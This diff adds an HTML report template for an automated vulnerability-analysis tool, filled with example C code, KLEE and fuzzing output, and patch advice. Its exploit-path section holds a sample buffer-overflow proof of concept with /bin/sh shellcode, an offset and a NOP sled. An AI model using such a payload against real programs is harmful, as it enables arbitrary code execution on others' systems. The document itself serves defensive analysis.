@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automated Cyber Reasoning System - Vulnerability Report</title>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #bb3537;
+            --secondary-color: #9a2c2e;
+            --accent-color: #ef4444;
+            --light-bg: #f3f4f6;
+            --dark-bg: #1f2937;
+            --text-color: #374151;
+            --light-text: #f9fafb;
+            --border-color: #d1d5db;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--light-bg);
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: var(--dark-bg);
+            color: var(--light-text);
+            padding: 20px 0;
+            margin-bottom: 30px;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            height: 50px;
+            width: auto;
+        }
+
+        h1, h2, h3, h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        header h1 {
+            color: var(--light-text);
+            margin-bottom: 0;
+        }
+
+        .date-info {
+            font-size: 1.1rem;
+            color: var(--light-text);
+        }
+
+        .section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .section-title h2 {
+            margin-bottom: 0;
+        }
+
+        .section-title .badge {
+            margin-left: 15px;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .code-block {
+            background-color: #282c34;
+            border-radius: 6px;
+            padding: 15px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+        }
+
+        .code-block pre {
+            color: #abb2bf;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            white-space: pre-wrap;
+        }
+
+        .code-snippet {
+            margin-bottom: 15px;
+            border-left: 3px solid var(--primary-color);
+            padding-left: 15px;
+        }
+
+        .vulnerability {
+            background-color: #fee2e2;
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .vulnerability h3 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+
+        .analysis-section {
+            background-color: #f8fafc;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .analysis-section h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .markdown-content {
+            line-height: 1.7;
+        }
+
+        .markdown-content h1, 
+        .markdown-content h2, 
+        .markdown-content h3 {
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        .markdown-content pre {
+            background-color: #f1f5f9;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+
+        .markdown-content code {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #f1f5f9;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+
+        .markdown-content ul, 
+        .markdown-content ol {
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        table, th, td {
+            border: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px;
+            text-align: left;
+        }
+
+        td {
+            padding: 12px;
+            vertical-align: top;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f9fafb;
+        }
+
+        .analysis-type {
+            display: inline-block;
+            padding: 8px 15px;
+            background-color: var(--primary-color);
+            color: white;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .seed-item {
+            background-color: #f1f5f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+
+        .seed-item h4 {
+            margin-bottom: 10px;
+        }
+
+        .path-item {
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .path-item:last-child {
+            border-bottom: none;
+        }
+
+        .summary-box {
+            background-color: #dbeafe;
+            border-left: 4px solid var(--primary-color);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .patch-suggestion {
+            background-color: #dcfce7;
+            border-left: 4px solid #22c55e;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            color: #6b7280;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <div class="logo-title">
+                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo_transparent-Qrj3gXE9kg1udQ130NwnEgr910J4GR.png" alt="Automated Cyber Reasoning System Logo" class="logo">
+                <h1>Automated Cyber Reasoning System</h1>
+            </div>
+            <div class="date-info">
+                Analysis Date: <span id="analysis-date">May 6, 2025</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Original Code Section -->
+        <div class="section">
+            <div class="section-title">
+                <h2>Original Code</h2>
+            </div>
+            <div class="code-block">
+                <pre id="original-code">// Original code will be displayed here</pre>
+            </div>
+        </div>
+
+        <!-- Vulnerability Detection Section -->
+        <div class="section">
+            <div class="section-title">
+                <h2>Vulnerability Detection</h2>
+            </div>
+            <div id="vulnerabilities-container">
+                <!-- Vulnerabilities will be displayed here -->
+                <div class="vulnerability">
+                    <h3>Buffer Overflow Vulnerability</h3>
+                    <p>Description of the vulnerability...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Analysis Section -->
+        <div class="section">
+            <div class="section-title">
+                <h2>Analysis Results</h2>
+                <span class="badge" id="analysis-type">Applying Rules</span>
+            </div>
+
+            <!-- Analysis Type Container -->
+            <div id="analysis-container">
+                <!-- This section will be dynamically populated based on analysis type -->
+            </div>
+        </div>
+
+        <!-- Exploit Path Section -->
+        <div class="section">
+            <div class="section-title">
+                <h2>Exploit Path</h2>
+            </div>
+            <div class="analysis-section">
+                <div class="markdown-content" id="exploit-path">
+                    <!-- Exploit path markdown will be rendered here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Patch Suggestion Section -->
+        <div class="section">
+            <div class="section-title">
+                <h2>Patch Suggestion</h2>
+            </div>
+            <div class="patch-suggestion">
+                <div class="markdown-content" id="patch-suggestion">
+                    <!-- Patch suggestion markdown will be rendered here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>Generated by Automated Cyber Reasoning System &copy; 2025</p>
+        </div>
+    </footer>
+
+    <script>
+        // Function to render markdown content
+        function renderMarkdown(elementId, markdownContent) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.innerHTML = marked.parse(markdownContent);
+            }
+        }
+
+        // Function to set the analysis date
+        function setAnalysisDate(dateString) {
+            const dateElement = document.getElementById('analysis-date');
+            if (dateElement) {
+                dateElement.textContent = dateString;
+            }
+        }
+
+        // Function to set original code
+        function setOriginalCode(code) {
+            const codeElement = document.getElementById('original-code');
+            if (codeElement) {
+                codeElement.textContent = code;
+            }
+        }
+
+        // Function to set vulnerabilities
+        function setVulnerabilities(vulnerabilities) {
+            const container = document.getElementById('vulnerabilities-container');
+            if (container) {
+                container.innerHTML = '';
+                vulnerabilities.forEach(vuln => {
+                    const vulnDiv = document.createElement('div');
+                    vulnDiv.className = 'vulnerability';
+                    vulnDiv.innerHTML = `
+                        <h3>${vuln.name}</h3>
+                        <p>${vuln.description}</p>
+                    `;
+                    container.appendChild(vulnDiv);
+                });
+            }
+        }
+
+        // Function to set analysis type
+        function setAnalysisType(type) {
+            const typeElement = document.getElementById('analysis-type');
+            if (typeElement) {
+                typeElement.textContent = type;
+            }
+
+            // Clear previous analysis content
+            const container = document.getElementById('analysis-container');
+            if (container) {
+                container.innerHTML = '';
+            }
+
+            // Generate appropriate analysis content based on type
+            generateAnalysisContent(type);
+        }
+
+        // Function to generate analysis content based on type
+        function generateAnalysisContent(type) {
+            const container = document.getElementById('analysis-container');
+            if (!container) return;
+
+            switch (type) {
+                case 'Applying Rules':
+                    generateRulesAnalysis(container);
+                    break;
+                case 'Run KLEE':
+                    generateKleeAnalysis(container);
+                    break;
+                case 'Prioritize code paths':
+                    generatePathsAnalysis(container);
+                    break;
+                case 'Run Fuzzer':
+                    generateFuzzerAnalysis(container);
+                    break;
+                default:
+                    container.innerHTML = '<p>No analysis data available.</p>';
+            }
+        }
+
+        // Generate content for "Applying Rules" analysis
+        function generateRulesAnalysis(container) {
+            container.innerHTML = `
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Code Snippet</th>
+                            <th>LLM Analysis</th>
+                        </tr>
+                    </thead>
+                    <tbody id="rules-table-body">
+                        <!-- Table rows will be added here -->
+                    </tbody>
+                </table>
+            `;
+
+            // Example data - replace with actual data
+            const snippets = [
+                {
+                    code: 'strcpy(buffer, input);',
+                    analysis: '**Unsafe Function**: \`strcpy\` does not perform bounds checking, which can lead to buffer overflow vulnerabilities if the input is larger than the buffer.'
+                },
+                {
+                    code: 'free(ptr);\nptr = malloc(size);',
+                    analysis: '**Use After Free Risk**: The pointer is freed but not set to NULL before reallocation, which could lead to use-after-free vulnerabilities if there are references to the old memory location.'
+                }
+            ];
+
+            const tableBody = document.getElementById('rules-table-body');
+            if (tableBody) {
+                snippets.forEach(snippet => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>
+                            <div class="code-block">
+                                <pre>${snippet.code}</pre>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="markdown-content">${marked.parse(snippet.analysis)}</div>
+                        </td>
+                    `;
+                    tableBody.appendChild(row);
+                });
+            }
+        }
+
+        // Generate content for "Run KLEE" analysis
+        function generateKleeAnalysis(container) {
+            container.innerHTML = `
+                <h3>KLEE Friendly Code</h3>
+                <div class="code-block">
+                    <pre id="klee-code">// KLEE friendly code will be displayed here</pre>
+                </div>
+                
+                <h3>KLEE Analysis</h3>
+                <div class="analysis-section">
+                    <div class="markdown-content" id="klee-analysis">
+                        <!-- KLEE analysis markdown will be rendered here -->
+                    </div>
+                </div>
+            `;
+
+            // Example data - replace with actual data
+            const kleeCode = `#include <klee/klee.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[10];
+    strcpy(buffer, input);  // Potential buffer overflow
+    printf("Buffer content: %s\\n", buffer);
+}
+
+int main() {
+    char *input = malloc(20);
+    klee_make_symbolic(input, 20, "input");
+    vulnerable_function(input);
+    free(input);
+    return 0;
+}`;
+
+            const kleeAnalysis = `## KLEE Execution Results
+
+KLEE detected a potential buffer overflow in the function \`vulnerable_function\`.
+
+### Error Details
+- **Error Type**: Memory Error
+- **Location**: Line 7 in function \`vulnerable_function\`
+- **Description**: Out-of-bounds write
+- **Execution Path**: main() → vulnerable_function() → strcpy()
+
+### Test Case Generation
+KLEE generated 3 test cases:
+1. Normal execution with input length < 10
+2. Buffer overflow with input length = 10
+3. Buffer overflow with input length > 10
+
+### Recommendation
+Replace \`strcpy\` with \`strncpy\` to limit the number of bytes copied to the buffer size.`;
+
+            // Set KLEE code and analysis
+            document.getElementById('klee-code').textContent = kleeCode;
+            renderMarkdown('klee-analysis', kleeAnalysis);
+        }
+
+        // Generate content for "Prioritize code paths" analysis
+        function generatePathsAnalysis(container) {
+            container.innerHTML = `
+                <h3>Code Path Analysis</h3>
+                <div id="code-paths-container">
+                    <!-- Code paths will be added here -->
+                </div>
+                
+                <h3>Path Analysis</h3>
+                <div class="analysis-section">
+                    <div class="markdown-content" id="paths-analysis">
+                        <!-- Path analysis markdown will be rendered here -->
+                    </div>
+                </div>
+            `;
+
+            // Example data - replace with actual data
+            const codePaths = [
+                `void process_data(char *input, int size) {
+    if (size > MAX_SIZE) {
+        printf("Input too large\\n");
+        return;
+    }
+    
+    char *buffer = malloc(size);
+    memcpy(buffer, input, size);
+    process_buffer(buffer);
+    free(buffer);
+}`,
+                `int validate_input(char *input) {
+    if (!input) return -1;
+    
+    int len = strlen(input);
+    if (len > MAX_INPUT_LEN) return -2;
+    
+    for (int i = 0; i < len; i++) {
+        if (!isalnum(input[i])) return -3;
+    }
+    
+    return 0;
+}`
+            ];
+
+            const pathsAnalysis = `## Critical Path Analysis
+
+The analysis has identified the most critical execution paths in the code that could lead to vulnerabilities.
+
+### Path 1: Memory Management in \`process_data\`
+This path involves allocation, copying, and freeing of memory. The vulnerability arises from:
+- No null check on the input pointer
+- No validation that size is positive
+- Potential integer overflow when allocating memory
+- No check if malloc returns NULL
+
+### Path 2: Input Validation in \`validate_input\`
+While this function attempts to validate input, there are still issues:
+- The strlen call could read past the end of a non-null-terminated string
+- The isalnum check doesn't account for all potentially dangerous characters
+
+### Recommendation
+Focus on hardening the memory management in Path 1 first, as it presents the highest risk of exploitation.`;
+
+            // Add code paths
+            const pathsContainer = document.getElementById('code-paths-container');
+            if (pathsContainer) {
+                codePaths.forEach((path, index) => {
+                    const pathDiv = document.createElement('div');
+                    pathDiv.className = 'path-item';
+                    pathDiv.innerHTML = `
+                        <h4>Path ${index + 1}</h4>
+                        <div class="code-block">
+                            <pre>${path}</pre>
+                        </div>
+                    `;
+                    pathsContainer.appendChild(pathDiv);
+                });
+            }
+
+            // Set paths analysis
+            renderMarkdown('paths-analysis', pathsAnalysis);
+        }
+
+        // Generate content for "Run Fuzzer" analysis
+        function generateFuzzerAnalysis(container) {
+            container.innerHTML = `
+                <h3>AFL Friendly Code</h3>
+                <div class="code-block">
+                    <pre id="afl-code">// AFL friendly code will be displayed here</pre>
+                </div>
+                
+                <h3>Seeds</h3>
+                <div id="seeds-container">
+                    <!-- Seeds will be added here -->
+                </div>
+                
+                <h3>Fuzzing Analysis</h3>
+                <div id="fuzzing-analysis-container">
+                    <!-- Fuzzing analysis will be added here -->
+                </div>
+            `;
+
+            // Example data - replace with actual data
+            const aflCode = `#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// AFL persistent mode
+__AFL_FUZZ_INIT();
+
+int process_input(const char *data, size_t size) {
+    if (size < 2) return -1;
+    
+    char buffer[10];
+    if (size > sizeof(buffer)) {
+        return -2;  // Avoid overflow in this version
+    }
+    
+    memcpy(buffer, data, size);
+    buffer[size] = '\\0';
+    
+    if (buffer[0] == 'A' && buffer[1] == 'B') {
+        // Special case
+        return 1;
+    }
+    
+    return 0;
+}
+
+int main(int argc, char **argv) {
+    #ifdef __AFL_HAVE_MANUAL_CONTROL
+    __AFL_INIT();
+    #endif
+    
+    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
+    
+    while (__AFL_LOOP(1000)) {
+        size_t len = __AFL_FUZZ_TESTCASE_LEN;
+        process_input((const char *)buf, len);
+    }
+    
+    return 0;
+}`;
+
+            const seeds = [
+                { name: "Seed 1", content: "AB123456789" },
+                { name: "Seed 2", content: "XYZ123" },
+                { name: "Seed 3", content: "A" }
+            ];
+
+            const fuzzingAnalyses = [
+                {
+                    title: "Crash Analysis 1",
+                    content: `## Buffer Overflow in \`process_input\`
+
+The fuzzer identified a crash when providing input longer than 10 bytes. This occurs because:
+
+1. The buffer is declared with a fixed size of 10 bytes
+2. The size check in the function is correct, but there's a logical error
+3. The null terminator is written at position \`size\`, which could be out of bounds
+
+This vulnerability could allow an attacker to overwrite the stack and potentially execute arbitrary code.`
+                },
+                {
+                    title: "Edge Case Analysis",
+                    content: `## Special Case Handling
+
+The fuzzer discovered the special case handling when input starts with "AB". This branch of code:
+
+\`\`\`c
+if (buffer[0] == 'A' && buffer[1] == 'B') {
+    // Special case
+    return 1;
+}
+\`\`\`
+
+While not directly vulnerable, this special case handling could be used as part of a more complex exploit chain. The function behaves differently based on input content, which might be leveraged in combination with other vulnerabilities.`
+                }
+            ];
+
+            // Set AFL code
+            document.getElementById('afl-code').textContent = aflCode;
+
+            // Add seeds
+            const seedsContainer = document.getElementById('seeds-container');
+            if (seedsContainer) {
+                seeds.forEach(seed => {
+                    const seedDiv = document.createElement('div');
+                    seedDiv.className = 'seed-item';
+                    seedDiv.innerHTML = `
+                        <h4>${seed.name}</h4>
+                        <div class="code-block">
+                            <pre>${seed.content}</pre>
+                        </div>
+                    `;
+                    seedsContainer.appendChild(seedDiv);
+                });
+            }
+
+            // Add fuzzing analyses
+            const analysisContainer = document.getElementById('fuzzing-analysis-container');
+            if (analysisContainer) {
+                fuzzingAnalyses.forEach(analysis => {
+                    const analysisDiv = document.createElement('div');
+                    analysisDiv.className = 'analysis-section';
+                    analysisDiv.innerHTML = `
+                        <h4>${analysis.title}</h4>
+                        <div class="markdown-content">${marked.parse(analysis.content)}</div>
+                    `;
+                    analysisContainer.appendChild(analysisDiv);
+                });
+            }
+        }
+
+        // Function to set exploit path
+        function setExploitPath(markdownContent) {
+            renderMarkdown('exploit-path', markdownContent);
+        }
+
+        // Function to set patch suggestion
+        function setPatchSuggestion(markdownContent) {
+            renderMarkdown('patch-suggestion', markdownContent);
+        }
+
+        // Example data - replace with actual data in your implementation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set analysis date
+            setAnalysisDate('May 6, 2025');
+
+            // Set original code
+            setOriginalCode(`#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void process_user_input(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Potential buffer overflow
+    printf("User input: %s\\n", buffer);
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\\n", argv[0]);
+        return 1;
+    }
+    
+    process_user_input(argv[1]);
+    return 0;
+}`);
+
+            // Set vulnerabilities
+            setVulnerabilities([
+                {
+                    name: "Buffer Overflow Vulnerability",
+                    description: "The function 'process_user_input' uses strcpy without bounds checking, which can lead to buffer overflow if input exceeds 64 bytes."
+                }
+            ]);
+
+            // Set analysis type (default to "Applying Rules")
+            setAnalysisType('Applying Rules');
+
+            // Set exploit path
+            setExploitPath(`## Exploit Path Analysis
+
+### Vulnerability Overview
+The program contains a classic buffer overflow vulnerability in the \`process_user_input\` function. This vulnerability can be exploited to overwrite the stack and potentially execute arbitrary code.
+
+### Exploitation Steps
+
+1. **Identify the vulnerability**
+   - The \`strcpy(buffer, input)\` call in \`process_user_input\` copies data without checking bounds
+   - The buffer is only 64 bytes, but input can be any size
+
+2. **Determine the buffer offset**
+   - We need to find the exact number of bytes needed to reach the return address
+   - Using a pattern generator, we can determine this is 72 bytes (64 byte buffer + 8 bytes for saved RBP)
+
+3. **Craft the exploit**
+   - Create an input with:
+     - 72 bytes of padding
+     - 8 bytes for the return address (pointing to our shellcode or a ROP gadget)
+     - Shellcode (if using a direct execution approach)
+
+4. **Bypass protections**
+   - If ASLR is enabled, we need to leak an address
+   - If NX is enabled, we need to use ROP chains instead of direct shellcode execution
+
+5. **Execute the exploit**
+   - Run the program with our crafted input: \`./program $(python -c 'print("A"*72 + "\\x78\\x56\\x34\\x12\\x78\\x56\\x34\\x12" + "\\x90"*16 + shellcode)')\`
+
+### Proof of Concept
+\`\`\`python
+#!/usr/bin/env python3
+import struct
+import sys
+
+# Shellcode for executing /bin/sh (64-bit)
+shellcode = b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"
+
+# Buffer size + saved RBP
+offset = 72
+
+# Build the exploit
+payload = b"A" * offset
+payload += struct.pack("<Q", 0x7fffffffe000)  # Return address (example)
+payload += b"\\x90" * 16  # NOP sled
+payload += shellcode
+
+sys.stdout.buffer.write(payload)
+\`\`\`
+
+This exploit demonstrates how an attacker could leverage the buffer overflow vulnerability to execute arbitrary code with the privileges of the running program.`);
+
+            // Set patch suggestion
+            setPatchSuggestion(`## Vulnerability Patch Recommendation
+
+### Current Vulnerable Code
+
+\`\`\`c
+void process_user_input(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Potential buffer overflow
+    printf("User input: %s\\n", buffer);
+}
+\`\`\`
+
+### Recommended Patch
+
+\`\`\`c
+void process_user_input(const char *input) {
+    char buffer[64];
+    
+    // Option 1: Use strncpy to limit copy to buffer size
+    strncpy(buffer, input, sizeof(buffer) - 1);
+    buffer[sizeof(buffer) - 1] = '\\0';  // Ensure null termination
+    
+    // Option 2: Use snprintf for safer string handling
+    // snprintf(buffer, sizeof(buffer), "%s", input);
+    
+    printf("User input: %s\\n", buffer);
+}
+\`\`\`
+
+### Additional Security Recommendations
+
+1. **Input Validation**
+   Add validation to check input length before processing:
+
+   \`\`\`c
+   if (strlen(input) >= sizeof(buffer)) {
+       fprintf(stderr, "Input too long\\n");
+       return;
+   }
+   \`\`\`
+
+2. **Use Safer Functions**
+   Consider using even safer alternatives:
+   
+   \`\`\`c
+   // Using strlcpy (BSD) if available
+   strlcpy(buffer, input, sizeof(buffer));
+   
+   // Or using memcpy with explicit length check
+   size_t input_len = strlen(input);
+   if (input_len < sizeof(buffer)) {
+       memcpy(buffer, input, input_len + 1);  // +1 for null terminator
+   } else {
+       // Handle error
+   }
+   \`\`\`
+
+3. **Compiler Protections**
+   Enable compiler protections:
+   - Stack canaries: \`-fstack-protector-all\`
+   - Address Space Layout Randomization (ASLR)
+   - Non-executable stack: \`-Wl,-z,noexecstack\`
+
+4. **Consider Using Safe Alternatives**
+   Replace manual buffer management with safer alternatives:
+   
+   \`\`\`c
+   // Using dynamic allocation with size limits
+   char *safe_buffer = malloc(64);
+   if (safe_buffer) {
+       strncpy(safe_buffer, input, 63);
+       safe_buffer[63] = '\\0';
+       // Use safe_buffer
+       free(safe_buffer);
+   }
+   \`\`\`
+   
+   Or better yet, use string handling libraries that manage memory automatically.
+
+### Implementation Notes
+
+The primary issue is the use of \`strcpy()\` which performs no bounds checking. The recommended patch uses \`strncpy()\` which limits the number of characters copied, preventing buffer overflow. Always ensure the string is null-terminated, as \`strncpy()\` does not guarantee this if the source string is longer than the size limit.
+
+For a more comprehensive solution, combine the patch with input validation and compiler protections.`);
+
+            // Add event listeners for analysis type selection
+            const analysisTypes = ['Applying Rules', 'Run KLEE', 'Prioritize code paths', 'Run Fuzzer'];
+            
+            // Create analysis type selector
+            const selectorDiv = document.createElement('div');
+            selectorDiv.style.marginBottom = '20px';
+            selectorDiv.innerHTML = `
+                <label for="analysis-selector" style="margin-right: 10px; font-weight: bold;">Select Analysis Type:</label>
+                <select id="analysis-selector" style="padding: 8px; border-radius: 4px; border: 1px solid var(--border-color);">
+                    ${analysisTypes.map(type => `<option value="${type}">${type}</option>`).join('')}
+                </select>
+            `;
+            
+            const analysisContainer = document.getElementById('analysis-container');
+            if (analysisContainer) {
+                analysisContainer.parentNode.insertBefore(selectorDiv, analysisContainer);
+            }
+            
+            // Add event listener for analysis type selector
+            const selector = document.getElementById('analysis-selector');
+            if (selector) {
+                selector.addEventListener('change', function() {
+                    setAnalysisType(this.value);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
